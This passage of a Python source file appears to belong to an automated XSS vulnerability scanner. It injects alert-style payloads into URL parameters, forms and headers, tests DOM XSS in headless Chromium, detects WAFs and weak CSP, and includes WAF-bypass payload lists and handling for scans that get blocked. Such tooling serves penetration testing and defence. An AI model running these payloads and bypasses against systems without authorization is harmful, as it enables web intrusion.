import requests
import random
import re
import sys
import os
import threading
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin, quote
from parametizer.bounded_pool import run_threadpool_pending_bounded
from colorama import init, ansi
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
import urllib3
try:
    from scanners.throttle import request_throttle
except ImportError:
    from throttle import request_throttle

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager

# Importar el sistema de manejo de bloqueos
try:
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from core.block_handler import create_safe_request_session
    BLOCK_HANDLER_AVAILABLE = True
except ImportError:
    BLOCK_HANDLER_AVAILABLE = False

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── DOM XSS headless config ────────────────────────────────────────────────────
# Solo los 2 payloads más efectivos para DOM-based: img onerror y svg onload.
# Más payloads = más tiempo por URL. Si alguno falla el otro suele cubrir el caso.
_DOM_XSS_PAYLOADS = [
    # Alert clásico — detectable via dialog event
    "<img src=x onerror=\"alert('neluxXSS')\">",
    "<svg/onload=\"alert('neluxXSS')\">",
    # console.log — detectable via console event (Angular/React sanitizan alert pero no console)
    "<img src=x onerror=\"console.log('neluxXSS')\">",
    "<svg/onload=\"console.log('neluxXSS')\">",
    # Sin etiquetas HTML — sinks como innerHTML con ejecución directa
    "javascript:alert('neluxXSS')",
    # Event handler en atributo — útil cuando el contexto es un atributo HTML
    "\" onmouseover=\"alert('neluxXSS')\" x=\"",
    "' onmouseover='alert(\"neluxXSS\")' x='",
    # Template injection Angular/Vue (si el sink es interpolación)
    "{{constructor.constructor('alert(\"neluxXSS\")')()}}",
]
_DOM_XSS_MARKER      = "neluxXSS"
_DOM_XSS_URL_LIMIT   = 60    # max URLs testeadas headlessly
_DOM_XSS_TIMEOUT     = 6000  # ms por navegación (aumentado para SPAs lentas)
_DOM_XSS_SETTLE      = 1200  # ms post-load para Angular/React (aumentado de 600)
_DOM_XSS_SPA_SETTLE  = 2500  # ms extra para fragment URLs (SPAs con routing)
_DOM_XSS_MAX_WORKERS = 4     # instancias paralelas de Chromium

# Parámetros que suelen reflejarse en el DOM (mayor prioridad en el batch headless)
_DOM_XSS_PRIORITY_PARAMS: frozenset = frozenset({
    "q", "s", "search", "query", "keyword", "keywords", "term", "terms",
    "content", "text", "input", "name", "value", "msg", "message",
    "comment", "data", "html", "title", "description", "body", "subject",
    "url", "redirect", "return", "next", "to", "from", "path",
    "file", "src", "source", "cat", "category", "type", "page",
})

_STATIC_EXTENSIONS = (
    ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg",
    ".woff", ".woff2", ".ico", ".ttf", ".eot", ".mp4", ".webm", ".pdf",
)

_TRACKING_PARAMS: frozenset = frozenset({
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "utm_id", "utm_reader", "utm_name", "utm_placing",
    "fbclid", "gclid", "msclkid", "dclid", "twclid",
    "_ga", "_gid", "_gl", "_hsenc", "_hsmi",
    "mc_eid", "mc_cid",
    "ref", "referrer",
})

_HASHED_PAGE_RE = re.compile(r'^[0-9a-f]{6,}_page$', re.IGNORECASE)


def _is_static_path(url: str) -> bool:
    path = urlparse(url).path.lower()
    return path.endswith(_STATIC_EXTENSIONS)


def _is_non_injectable_param(param: str) -> bool:
    p = param.lower()
    return p in _TRACKING_PARAMS or bool(_HASHED_PAGE_RE.match(p))


def _strip_tracking_params(url: str) -> str:
    """
    Devuelve la URL sin parámetros de tracking (UTM, fbclid, etc.).
    Usada para normalizar URLs de formularios antes del dedup,
    evitando que la misma form en 50 variantes UTM genere 50 findings.

    Normaliza también las variantes con amp%3B y amp%3Bamp%3B encodings
    (doble-codificación de '&' en Query Strings mal generados por CMS),
    que producen params como 'amp;utm_medium' o 'amp;amp;utm_medium'.
    """
    try:
        from urllib.parse import urlunparse, unquote
        p = urlparse(url)

        # Decodificar primero el query string para normalizar `amp%3B` → `amp;`
        # y luego re-parsear. Esto unifica ?utm_x=a y ?amp%3Butm_x=a y ?amp%3Bamp%3Butm_x=a
        decoded_qs = unquote(p.query)

        def _strip_amp_prefix(k: str) -> str:
            """Quita prefijos 'amp;' repetidos del nombre del parámetro."""
            while k.lower().startswith("amp;"):
                k = k[4:]
            return k

        raw_pairs = parse_qs(decoded_qs, keep_blank_values=True)
        clean_qs = {
            _strip_amp_prefix(k): v
            for k, v in raw_pairs.items()
            if _strip_amp_prefix(k).lower() not in _TRACKING_PARAMS
        }
        from urllib.parse import urlencode
        return urlunparse(p._replace(query=urlencode(clean_qs, doseq=True)))
    except Exception:
        return url


# Headers inyectables para XSS (reflejados en error pages, logs, etc.)
_XSS_INJECTABLE_HEADERS: list = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Forwarded-Host",
    "Accept-Language",
    "CF-Connecting-IP",
]

# Campos JSON comunes para probar en endpoints sin query params
_JSON_COMMON_FIELDS: list = [
    "email", "username", "user", "login", "password",
    "q", "query", "search", "keyword", "term",
    "id", "name", "value", "param", "input", "data",
    "comment", "message", "text", "content", "body",
]

# Cache para detección de endpoints que aceptan JSON
_json_accept_cache: dict = {}
_json_accept_lock = threading.Lock()


def _probe_accepts_json(base_url: str, headers: dict) -> bool:
    """Detecta si el endpoint acepta Content-Type: application/json (respuesta != 415)."""
    with _json_accept_lock:
        if base_url in _json_accept_cache:
            return _json_accept_cache[base_url]
    try:
        h = dict(headers)
        h["Content-Type"] = "application/json"
        r = requests.post(base_url, json={}, headers=h, verify=False, timeout=4)
        accepts = r.status_code != 415
    except Exception:
        accepts = False
    with _json_accept_lock:
        _json_accept_cache[base_url] = accepts
    return accepts


def _has_fragment_params(url: str) -> bool:
    """Retorna True si la URL tiene query params dentro del fragmento (e.g. /#/search?q=val)."""
    frag = urlparse(url).fragment
    return "?" in frag


def _get_fragment_qs(url: str) -> dict:
    """Extrae los query params del fragmento de la URL. Retorna dict vacío si no hay."""
    frag = urlparse(url).fragment
    if "?" not in frag:
        return {}
    try:
        return parse_qs(frag.split("?", 1)[1])
    except Exception:
        return {}


def _dom_xss_sort_key(url: str) -> int:
    """Retorna 0 si la URL tiene al menos un param prioritario (va primero), 1 si no."""
    try:
        qs = parse_qs(urlparse(url).query) or _get_fragment_qs(url)
        if any(p.lower() in _DOM_XSS_PRIORITY_PARAMS for p in qs):
            return 0
    except Exception:
        pass
    return 1


def _dom_xss_batch(
    urls: list,
    already_found: set,
    custom_headers: dict = None,
    threads: int = None,
) -> list:
    """
    Fase DOM-based XSS con Playwright headless Chromium — ejecución paralela.

    Lanza `_DOM_XSS_MAX_WORKERS` instancias independientes de Chromium en threads
    separados, cada una trabajando sobre su chunk de URLs.
    Cada instancia tiene su propio sync_playwright / browser / page, lo que evita
    la condición de carrera de compartir objetos Playwright entre hilos.

    Detecta ejecución JS real escuchando el evento 'dialog' (alert/confirm/prompt).
    Las URLs con parámetros de alta prioridad (q=, search=, content=…) se prueban primero.

    Retorna lista de tuplas (url_con_payload, param, payload).
    """
    try:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from parametizer.headless_crawl import _prefer_bundled_playwright, _restore_sys_path
    except ImportError:
        return []

    inserted = _prefer_bundled_playwright()
    results = []

    try:
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            return []

        # Filtrar y ordenar: incluir URLs con params en query string O en fragment (#/path?param=)
        candidates = [
            u for u in urls
            if (parse_qs(urlparse(u).query) or _has_fragment_params(u))
            and not _is_static_path(u)
            and f"{urlparse(u).scheme}://{urlparse(u).netloc}{urlparse(u).path}" not in already_found
        ]
        candidates.sort(key=_dom_xss_sort_key)
        candidates = candidates[:_DOM_XSS_URL_LIMIT]
        total_cand = len(candidates)

        if total_cand == 0:
            return []

        # Determinar workers: limitado por cantidad de URLs y _DOM_XSS_MAX_WORKERS
        n_workers = max(1, min(_DOM_XSS_MAX_WORKERS, threads or _DOM_XSS_MAX_WORKERS, total_cand))

        # Dividir candidatos en n_workers chunks
        chunks = [candidates[i::n_workers] for i in range(n_workers)]

        results_lock = threading.Lock()
        progress_lock = threading.Lock()
        done_counter = [0]

        def _worker(chunk: list) -> None:
            """Cada worker lanza su propio browser y procesa su chunk."""
            try:
                with sync_playwright() as pw:
                    browser = pw.chromium.launch(
                        headless=True,
                        args=[
                            "--no-sandbox",
                            "--disable-dev-shm-usage",
                            "--disable-gpu",
                            "--disable-software-rasterizer",
                        ],
                    )
                    try:
                        ctx = browser.new_context(
                            ignore_https_errors=True,
                            extra_http_headers=custom_headers or {},
                        )
                        page = ctx.new_page()
                        dialog_history: list = []
                        console_history: list = []

                        def _on_dialog(dialog):
                            try:
                                msg = dialog.message or ""
                            except Exception:
                                msg = ""
                            dialog_history.append(msg)
                            try:
                                dialog.dismiss()
                            except Exception:
                                pass

                        def _on_console(msg):
                            try:
                                txt = msg.text or ""
                            except Exception:
                                txt = ""
                            console_history.append(txt)

                        page.on("dialog", _on_dialog)
                        page.on("console", _on_console)

                        for url in chunk:
                            with progress_lock:
                                done_counter[0] += 1
                                cnt = done_counter[0]

                            sys.stdout.write(
                                f"\r\033[K  [DOM XSS] {cnt}/{total_cand} (×{n_workers}w) | {url[:70]}"
                            )
                            sys.stdout.flush()

                            parsed = urlparse(url)
                            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                            # Soporte para fragment URLs: /#/path?param=value (SPAs Angular/React)
                            frag = parsed.fragment
                            is_fragment_url = "?" in frag
                            if is_fragment_url:
                                frag_path, frag_qs_str = frag.split("?", 1)
                                qs = parse_qs(frag_qs_str)
                            else:
                                qs = parse_qs(parsed.query)

                            if not qs:
                                continue

                            # SPAs con fragment necesitan más tiempo de settle
                            settle_ms = _DOM_XSS_SPA_SETTLE if is_fragment_url else _DOM_XSS_SETTLE

                            vuln_found_for_url = False
                            for param in qs:
                                if _is_non_injectable_param(param):
                                    continue
                                if vuln_found_for_url:
                                    break

                                for payload in _DOM_XSS_PAYLOADS:
                                    dialog_history.clear()
                                    console_history.clear()

                                    data = {p: "TEST123" for p in qs}
                                    data[param] = payload

                                    if is_fragment_url:
                                        # Reconstruir URL con payload en el fragment
                                        new_frag_qs = urllib.parse.urlencode(data, doseq=True)
                                        test_url_str = f"{base_url}#{frag_path}?{new_frag_qs}"
                                    else:
                                        test_url_str = base_url + "?" + urllib.parse.urlencode(data, doseq=True)

                                    try:
                                        page.goto(
                                            test_url_str,
                                            wait_until="load",
                                            timeout=_DOM_XSS_TIMEOUT,
                                        )
                                        page.wait_for_timeout(settle_ms)
                                    except Exception:
                                        continue

                                    # Detectar via dialog (alert/confirm/prompt)
                                    dialog_hit = any(_DOM_XSS_MARKER in m for m in dialog_history)
                                    # Detectar via console.log (Angular/React no bloquean console)
                                    console_hit = any(_DOM_XSS_MARKER in m for m in console_history)
                                    # Detectar via DOM — buscar el marker en contexto ejecutable
                                    # NO basta con innerHTML.includes(): el marker puede estar
                                    # en un href/RetURL y NO ejecutarse. Solo contar si:
                                    #  1. Aparece dentro de un <script> (JS directo)
                                    #  2. Aparece como value de un event handler (onclick, onerror, etc.)
                                    #  3. Aparece en un javascript: URI
                                    try:
                                        dom_hit = page.evaluate(f"""() => {{
                                            const m = '{_DOM_XSS_MARKER}';
                                            // 1. Dentro de <script>
                                            const scripts = document.querySelectorAll('script');
                                            for (const s of scripts) {{
                                                if (s.textContent && s.textContent.includes(m)) return true;
                                            }}
                                            // 2. En event handler attributes
                                            const allEls = document.querySelectorAll('*');
                                            for (const el of allEls) {{
                                                for (const attr of el.attributes) {{
                                                    if (attr.name.toLowerCase().startsWith('on') && attr.value.includes(m)) return true;
                                                }}
                                            }}
                                            // 3. En javascript: URIs (href, src, action)
                                            const linkAttrs = ['href', 'src', 'action', 'formaction', 'data', 'poster', 'background'];
                                            for (const el of allEls) {{
                                                for (const a of linkAttrs) {{
                                                    const v = el.getAttribute(a);
                                                    if (v && v.toLowerCase().includes('javascript:') && v.includes(m)) return true;
                                                }}
                                            }}
                                            return false;
                                        }}""") if not dialog_hit and not console_hit else False
                                    except Exception:
                                        dom_hit = False

                                    if dialog_hit or console_hit or dom_hit:
                                        sys.stdout.write("\r\033[K")
                                        sys.stdout.flush()
                                        with results_lock:
                                            results.append((test_url_str, param, payload))
                                        vuln_found_for_url = True
                                        break
                    finally:
                        try:
                            browser.close()
                        except Exception:
                            pass
            except Exception:
                pass

        # Lanzar workers en paralelo con ThreadPoolExecutor
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=n_workers) as executor:
            futs = [executor.submit(_worker, chunk) for chunk in chunks if chunk]
            for fut in as_completed(futs):
                fut.result()  # propaga excepciones si las hay

        sys.stdout.write("\r\033[K")
        sys.stdout.flush()

    except Exception:
        pass
    finally:
        _restore_sys_path(inserted)

    return results


def _is_payload_in_executable_context(html_text: str, payload: str) -> bool:
    """
    Verifica que el payload esté en un contexto ejecutable dentro del HTML.
    Retorna True solo si el payload aparece en un lugar donde el navegador lo ejecutaría.
    
    Contextos NO ejecutivos (falsos positivos):
    - Dentro de comentarios HTML: <!-- ... -->
    - HTML-entity encoded: &lt;script&gt;
    - Como contenido de <script> sin breakout (string literal)
    - Como atributo data-* o value sin escape de comillas
    - En mensajes de error / logs embebidos en el HTML
    - Puro JS syntax en HTML body (solo ejecuta dentro de <script>)
    """
    import html as _html

    # 1. Eliminar bloques <script> y <style> del análisis
    stripped = re.sub(r'<script[^>]*>.*?</script>', '', html_text, flags=re.DOTALL | re.IGNORECASE)
    stripped = re.sub(r'<style[^>]*>.*?</style>', '', stripped, flags=re.DOTALL | re.IGNORECASE)

    # 2. Eliminar comentarios HTML
    stripped = re.sub(r'<!--.*?-->', '', stripped, flags=re.DOTALL)

    # 3. Verificar si el payload está HTML-encoded (falso positivo)
    encoded_variants = [
        _html.escape(payload),
        _html.escape(payload, quote=True),
        payload.replace('<', '&lt;').replace('>', '&gt;'),
        payload.replace('<', '&#60;').replace('>', '&#62;'),
    ]
    for ev in encoded_variants:
        if ev in stripped and ev != payload:
            if payload not in stripped:
                return False

    # 4. Verificar reflexión directa del payload en el body HTML (fuera de scripts)
    if payload not in stripped:
        # También verificar con decodificación HTML
        decoded = _html.unescape(payload)
        if decoded != payload and decoded in stripped:
            pass  # continuar con checks de abajo
        else:
            return False

    # ── El payload APARECE en el HTML fuera de scripts/comentarios ──
    # Ahora verificar que sea un contexto donde un browser lo ejecutaría
    
    # 5. Si es un tag HTML (<img, <svg, <script, <iframe, <details, etc.)
    #    → es ejecutable en el body
    html_tag_pattern = re.compile(r'<\s*(?:img|svg|script|iframe|details|video|audio|embed|object|form|input|a|marquee|math|foreignobject)\b', re.IGNORECASE)
    if html_tag_pattern.search(payload):
        return True

    # 6. Si es attribute injection (comienza con " o ' y tiene event handler)
    if payload and payload[0] in ('"', "'"):
        # Patrón clásico: " onmouseover="alert(1)" x="
        event_handler = re.search(r'\bon\w+\s*=', payload, re.IGNORECASE)
        if event_handler:
            return True
        # O el payload cierra un atributo y abre tag: "><img src=x onerror=...>
        if payload.startswith('"') and '<' in payload:
            return True
        if payload.startswith("'") and '<' in payload:
            return True

    # 7. Si es javascript: URI scheme en href
    if re.match(r'^["\']?javascript\s*:', payload, re.IGNORECASE):
        return True

    # 8. Si es template injection ({{...}})
    if '{{' in payload and '}}' in payload:
        return True

    # 9. Puro JS syntax en body HTML NO es ejecutable
    #    (";alert(1)//, ';alert(1)//, `;alert(1)//) solo ejecuta dentro de <script>
    return False


def is_xss_response(text, payload, context: str = None):
    """Validación estricta para detectar XSS real, evitando falsos positivos comunes."""

    import html as _html

    # Salida rápida si la respuesta parece un error HTTP sin contenido de app
    tl = text.lower()
    if "404 not found" in tl or "403 forbidden" in tl or "500 internal server error" in tl:
        return False

    # Evitar confusión con errores SQL (el payload puede estar en el mensaje de error)
    if "sql syntax" in tl or "you have an error in your sql" in tl:
        return False

    if len(text.strip()) < 50:
        return False

    # Para bypasses de contexto js_string (ej: '";alert(1)//'):
    # 1. El payload debe aparecer DENTRO de un bloque <script>, no solo en el body HTML.
    #    Si aparece en el HTML fuera de script (ej: <p>Resultado: ";alert(1)//</p>),
    #    el XSS no ejecuta → falso positivo.
    # 2. La comilla inicial NO debe estar backslash-escapada (\";alert(1)// no ejecuta).
    if context == "js_string":
        candidates = [payload, _html.unescape(payload)]
        for candidate in candidates:
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text, re.DOTALL | re.IGNORECASE)
            in_script = any(candidate in block for block in script_blocks)
            if not in_script:
                continue
            escaped_variant = "\\" + candidate
            for block in script_blocks:
                if candidate not in block:
                    continue
                if escaped_variant in block and candidate not in block.replace(escaped_variant, ""):
                    continue
                return True
        return False

    # Si no se conoce el contexto, intentar js_string primero (si el payload parece serlo)
    # y si falla, caer al check general de contexto ejecutable.
    _looks_like_js_breakout = (
        payload and payload[:1] in ('"', "'") and
        ("alert" in payload or "confirm" in payload or "prompt" in payload) and
        ('//' in payload or '</script>' in payload.lower())
    )
    if context is None and _looks_like_js_breakout:
        candidates = [payload, _html.unescape(payload)]
        js_confirmed = False
        for candidate in candidates:
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text, re.DOTALL | re.IGNORECASE)
            in_script = any(candidate in block for block in script_blocks)
            if not in_script:
                continue
            escaped_variant = "\\" + candidate
            for block in script_blocks:
                if candidate not in block:
                    continue
                if escaped_variant in block and candidate not in block.replace(escaped_variant, ""):
                    continue
                js_confirmed = True
                break
            if js_confirmed:
                break
        if js_confirmed:
            return True
        # No confirmado en script → continuar con check general de contexto ejecutable

    # ── Verificar que el payload esté en contexto ejecutable ──
    if _is_payload_in_executable_context(text, payload):
        return True

    return False


# ---------------------------------------------------------------------------
# ANÁLISIS MULTI-CAPA: contexto, CSP, WAF y bypass payloads
# ---------------------------------------------------------------------------

_XSS_MARKER = "NELUXMATIZER"

# Payloads por contexto de reflejo
_XSS_CONTEXT_PAYLOADS: dict = {
    "html_body": [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<iframe src="javascript:alert(1)">',
    ],
    "html_attr": [
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '"><img src=x onerror=alert(1)>',
        '" onfocus="alert(1)" autofocus="',
    ],
    "js_string": [
        '";alert(1)//',
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        '`; alert(1) //`',
    ],
    "href_attr": [
        'javascript:alert(1)',
        'JaVaScRiPt:alert(1)',
        'data:text/html,<script>alert(1)</script>',
    ],
}

# Payloads de bypass de WAF (encoding, fragmentación, obfuscación)
_XSS_WAF_BYPASS_PAYLOADS: list = [
    '<img src=x onerror=alert`1`>',
    '<svg/onload=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
    '<img src=x onerror=\u0061lert(1)>',
    '<<script>alert(1)//<</script>',
    '<a href="javas&#99;ript:alert(1)">x</a>',
]

# Firmas de WAF comunes en headers y body
_WAF_SIGNATURES: dict = {
    "cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "attention required", "error 1010"],
    "akamai":      ["akamai", "reference #", "access denied - akamai"],
    "aws_waf":     ["awswaf", "x-amzn-requestid", "aws-waf"],
    "f5_bigip":    ["the requested url was rejected", "f5 networks"],
    "modsecurity": ["mod_security", "406 not acceptable", "modsecurity"],
    "imperva":     ["incapsula", "imperva", "_incap_"],
    "sucuri":      ["sucuri", "cloudproxy"],
    "barracuda":   ["barracuda", "barra_counter_session"],
}


def _detect_xss_context(text: str) -> str:
    """
    Detecta el contexto HTML donde aparece el marker NELUXMATIZER.
    Retorna: 'js_string' | 'href_attr' | 'html_attr' | 'html_body'
    Solo se llama cuando el marker está en el texto pero el payload fue modificado.
    """
    marker = _XSS_MARKER
    # 1. Dentro de <script>...</script>
    for m in re.finditer(r'<script[^>]*>(.*?)</script>', text, re.DOTALL | re.IGNORECASE):
        if marker in m.group(1):
            return "js_string"
    # 2. En atributo href, src, action, formaction
    if re.search(r'(?:href|src|action|formaction)=["\'][^"\']*' + re.escape(marker),
                 text, re.IGNORECASE):
        return "href_attr"
    # 3. En otros atributos HTML (value, placeholder, title, data-*, etc.)
    if re.search(r'[\w-]+=(?:["\'][^"\']*' + re.escape(marker) + r')', text, re.IGNORECASE):
        return "html_attr"
    return "html_body"


def _parse_csp(headers) -> tuple:
    """
    Parsea el header CSP. Retorna (csp_value, [weaknesses]).
    Posibles debilidades: 'no-csp', 'unsafe-inline', 'unsafe-eval',
    'wildcard-src', 'report-only', 'jsonp-cdn:<cdn>'.
    """
    csp = (headers.get("Content-Security-Policy") or
           headers.get("content-security-policy") or "")
    report_only = (headers.get("Content-Security-Policy-Report-Only") or
                   headers.get("content-security-policy-report-only") or "")
    if not csp:
        if report_only:
            return report_only, ["report-only"]
        return "", ["no-csp"]

    weaknesses = []
    csp_lower = csp.lower()
    if "'unsafe-inline'" in csp_lower:
        weaknesses.append("unsafe-inline")
    if "'unsafe-eval'" in csp_lower:
        weaknesses.append("unsafe-eval")
    if re.search(r'script-src\s+\*|default-src\s+\*', csp_lower):
        weaknesses.append("wildcard-src")
    jsonp_cdns = [
        "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "code.jquery.com",
        "ajax.googleapis.com", "unpkg.com",
    ]
    for cdn in jsonp_cdns:
        if cdn in csp_lower:
            weaknesses.append(f"jsonp-cdn:{cdn}")
    return csp, weaknesses


def _detect_waf(response) -> str:
    """Retorna nombre del WAF detectado, o '' si no se detecta ninguna firma."""
    headers_lower = str(dict(response.headers)).lower()
    body_lower = response.text[:2000].lower()
    for waf_name, sigs in _WAF_SIGNATURES.items():
        if any(s in headers_lower or s in body_lower for s in sigs):
            return waf_name
    # Status 403/406 con body muy corto → WAF genérico
    if response.status_code in (403, 406, 429) and len(response.text) < 500:
        return "generic-waf"
    return ""


def _xss_bypass_payloads_for(context: str, headers) -> list:
    """
    Combina payloads de bypass contextuales + WAF (si hay CSP débil).
    Retorna lista de payloads a probar (máx. 4 para no aumentar latencia).
    """
    _, csp_weaknesses = _parse_csp(headers)
    payloads = list(_XSS_CONTEXT_PAYLOADS.get(context, _XSS_CONTEXT_PAYLOADS["html_body"]))
    # Si hay CSP con unsafe-inline o sin CSP, los payloads contextuales ya funcionan
    # Si hay CSP estricta, agregar payloads de WAF/encoding como alternativa
    if "no-csp" not in csp_weaknesses and "unsafe-inline" not in csp_weaknesses:
        payloads = _XSS_WAF_BYPASS_PAYLOADS[:3] + payloads[:2]
    return payloads[:4]  # Máximo 4 requests extra por param

def xss(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False):
    print('\033[1;36m<<<<<<<<<<<<\033[0m Testing Cross-Site Scripting \033[1;36m>>>>>>>>>>>>>\033[0m')
    print()
    _xss_unique_bases = len({urlparse(u).netloc + urlparse(u).path for u in urip + urif})
    total = (
        (len(urip) * 3 + len(urif) * 2) * len(wordlist)   # GET+POST+JSON / FORM+JSON
        + _xss_unique_bases * min(3, len(wordlist))         # Header XSS
    )
    current = 0
    found = 0
    lock = threading.Lock()
    vuln_set = set()

    try:
        from scanners.ban_detector import get_ban_detector
    except ImportError:
        from ban_detector import get_ban_detector
    ban = get_ban_detector()

    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    form_cache = {}
    stdout_lock = threading.Lock()

    def test_url(url, payload):
        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
        nonlocal current, found
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)
        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

        if not qs or _is_static_path(url):
            with lock:
                current += 1
                update_progress(current, total)
            return

        # Crear sesión segura con manejo de bloqueos si está disponible
        if BLOCK_HANDLER_AVAILABLE:
            session = create_safe_request_session(headers)
        else:
            session = requests.Session()
            session.headers.update(headers)

        # Verificar si esta URL ya fue explotada usando el sistema unificado
        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total)
            return

        for param in qs:
            if _is_non_injectable_param(param):
                continue

            # Cache de baseline para GET
            baseline_key = f"GET-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                try:
                    data = {p: "TEST123" for p in qs}
                    r = session.get(base_url, params=data, verify=False, timeout=5)
                    # Descarta si redirige a otro dominio (los parámetros viajan en el redirect
                    # y el scanner detectaría el payload en la URL del destino → falso positivo)
                    if r.history:
                        orig_host = urlparse(base_url).netloc.lower()
                        final_host = urlparse(r.url).netloc.lower()
                        if orig_host != final_host:
                            baseline_cache[baseline_key] = "__CROSS_DOMAIN_REDIRECT__"
                        elif r.status_code == 200:
                            baseline_cache[baseline_key] = r.text
                        else:
                            baseline_cache[baseline_key] = ""
                    elif r.status_code == 200:
                        baseline_cache[baseline_key] = r.text
                    else:
                        baseline_cache[baseline_key] = ""
                except requests.exceptions.Timeout:
                    baseline_cache[baseline_key] = ""
                except requests.exceptions.RequestException:
                    baseline_cache[baseline_key] = ""
                except Exception:
                    baseline_cache[baseline_key] = ""
            baseline = baseline_cache[baseline_key]

            # Saltar si el endpoint redirige a otro dominio (FP por query params en redirect)
            if baseline == "__CROSS_DOMAIN_REDIRECT__" or not baseline:
                continue

            # Probar payload XSS
            domain = parsed.netloc
            if ban.is_banned(domain):
                with lock:
                    current += 1
                    update_progress(current, total)
                return

            data = {p: "TEST123" for p in qs}
            data[param] = payload
            try:
                r = session.get(base_url, params=data, verify=False, timeout=5, allow_redirects=True)
                ban.record(domain, r.status_code, r, base_url)

                def _report_xss_get(winning_payload, method_label="GET"):
                    """Reporta XSS confirmado y termina el loop."""
                    if not vuln_manager.is_already_exploited(base_url, param):
                        if not vuln_manager.verify_false_positive(base_url, winning_payload, method_label, custom_headers, random_agent):
                            vuln_manager.mark_as_exploited(base_url, param)
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            with stdout_lock:
                                print_vulnerability(f"\033[1;32m[{method_label}] [VULNERABLE]\033[0m {base_url}?{param}={quote(winning_payload)}")
                            entry = f"{base_url}?{param}={quote(winning_payload)}"
                            if method_label not in ("GET", "POST"):
                                entry += f"|||BYPASS_TECHNIQUE:{method_label}|||BYPASS_ORIGINAL:{quote(payload)}"
                            urls_vulnerables.append(entry)
                            return True
                    return False

                # ── CAPA 1: detección directa ──────────────────────────────
                if r.status_code == 200 and is_xss_response(r.text, payload) and r.text != baseline:
                    if payload in r.text or urllib.parse.unquote(payload) in r.text:
                        if _report_xss_get(payload):
                            with lock:
                                current += 1
                                update_progress(current, total)
                            found += 1
                            return

                # ── CAPA 2: bypass contextual (marker presente pero escapado) ─
                elif r.status_code == 200 and _XSS_MARKER in r.text and r.text != baseline:
                    context = _detect_xss_context(r.text)
                    bypass_list = _xss_bypass_payloads_for(context, r.headers)
                    for bp in bypass_list:
                        bp_data = {p: "TEST123" for p in qs}
                        bp_data[param] = bp
                        try:
                            rb = session.get(base_url, params=bp_data, verify=False, timeout=5, allow_redirects=True)
                            if rb.status_code == 200 and is_xss_response(rb.text, bp, context) and rb.text != baseline:
                                if _report_xss_get(bp, f"GET-BYPASS[{context}]"):
                                    with lock:
                                        current += 1
                                        update_progress(current, total)
                                    found += 1
                                    return
                        except Exception:
                            continue

                # ── CAPA 3: WAF detectado → bypass de encoding ─────────────
                elif r.status_code in (403, 406, 429):
                    waf = _detect_waf(r)
                    if waf:
                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
                            wp_data = {p: "TEST123" for p in qs}
                            wp_data[param] = wp
                            try:
                                rw = session.get(base_url, params=wp_data, verify=False, timeout=5, allow_redirects=True)
                                if rw.status_code == 200 and is_xss_response(rw.text, wp) and rw.text != baseline:
                                    if _report_xss_get(wp, f"GET-WAF-BYPASS[{waf}]"):
                                        with lock:
                                            current += 1
                                            update_progress(current, total)
                                        found += 1
                                        return
                            except Exception:
                                continue

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue

        # POST con los mismos parámetros
        for param in qs:
            if _is_non_injectable_param(param):
                continue

            # Cache de baseline para POST
            baseline_key = f"POST-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                try:
                    data = {p: "TEST123" for p in qs}
                    r = session.post(base_url, data=data, verify=False, timeout=5)
                    if r.history:
                        orig_host = urlparse(base_url).netloc.lower()
                        final_host = urlparse(r.url).netloc.lower()
                        if orig_host != final_host:
                            baseline_cache[baseline_key] = "__CROSS_DOMAIN_REDIRECT__"
                        elif r.status_code == 200:
                            baseline_cache[baseline_key] = r.text
                        else:
                            baseline_cache[baseline_key] = ""
                    elif r.status_code == 200:
                        baseline_cache[baseline_key] = r.text
                    else:
                        baseline_cache[baseline_key] = ""
                except requests.exceptions.Timeout:
                    baseline_cache[baseline_key] = ""
                except requests.exceptions.RequestException:
                    baseline_cache[baseline_key] = ""
                except Exception:
                    baseline_cache[baseline_key] = ""
            baseline = baseline_cache[baseline_key]

            if baseline == "__CROSS_DOMAIN_REDIRECT__" or not baseline:
                continue

            # Probar payload XSS
            if ban.is_banned(domain):
                with lock:
                    current += 1
                    update_progress(current, total)
                return

            data = {p: "TEST123" for p in qs}
            data[param] = payload
            try:
                r = session.post(base_url, data=data, verify=False, timeout=5, allow_redirects=True)
                ban.record(domain, r.status_code, r, base_url)

                def _report_xss_post(winning_payload, method_label="POST"):
                    if not vuln_manager.is_already_exploited(base_url, param):
                        if not vuln_manager.verify_false_positive(base_url, winning_payload, method_label, custom_headers, random_agent):
